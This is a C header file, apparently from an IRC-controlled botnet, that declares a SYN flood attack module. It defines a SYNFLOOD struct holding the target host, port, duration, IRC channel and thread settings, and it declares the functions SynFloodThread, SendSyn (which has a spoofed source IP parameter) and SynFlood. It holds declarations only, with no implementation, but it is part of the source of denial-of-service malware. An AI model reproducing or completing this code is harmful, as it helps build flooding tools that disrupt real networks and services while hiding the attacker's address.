#ifndef NO_SYN  
typedef struct SYNFLOOD {

	SOCKET sock;
	char host[128];
	char port[128];
	char length[128];
	char chan[64];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SYNFLOOD;

DWORD WINAPI SynFloodThread(LPVOID param);
long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
long SynFlood(char *target, char *port, char *len);
#endif
